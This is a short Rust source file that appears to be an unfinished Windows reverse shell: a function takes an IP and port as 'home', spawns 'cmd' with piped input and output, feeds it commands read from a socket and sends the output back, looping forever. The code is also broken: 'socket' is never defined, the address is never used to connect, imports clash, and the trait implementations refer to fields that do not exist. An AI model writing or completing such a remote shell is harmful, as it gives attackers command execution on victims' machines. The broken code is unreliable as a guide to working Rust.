use std::net::{TcpStream, SocketAddr};
use std::fs::File;
use std::process::{Command, Stdio};
use std::{thread, time};
use std::io::{Read, Write};
use std::error::Error;

extern crate socket2;
extern crate tokio;

 use std::os::windows::prelude::*;
 use tokio::net::{TcpStream, TcpListener};

use std::os::windows::io::{FromRawSocket, IntoRawSocket, AsRawSocket};
use std::os::windows::io::{FromRawHandle, AsRawHandle};

    
impl AsRawHandle for TcpStream {
 fn as_raw_handle(&self) -> RawHandle {
     self.io.get_ref().as_raw_handle()
 }
}

impl AsRawHandle for TcpListener {
 fn as_raw_handle(&self) -> RawHandle {
     self.listener.io().as_raw_handle()
 }
}


pub fn thefunction(ip: String, port: String) {
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){
        let mut s = socket.into_tcp_stream();

        let process = Command::new("cmd")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn().unwrap();

        let mut buf = vec![];
        s.read(&mut buf);
        match process.stdin.unwrap().write_all(&buf) {
            Err(why) => panic!("couldn't write to shell stdin: {}", why.description()),
            Ok(_) => println!("send command to shell"),
        }
        match process.stdout.unwrap().read_to_end(&mut buf) {
            Err(why) => panic!("couldn't read shell stdout: {}", why.description()),
            Ok(_) => s.write_all(&buf).unwrap(),
        }

    sh(home);
}
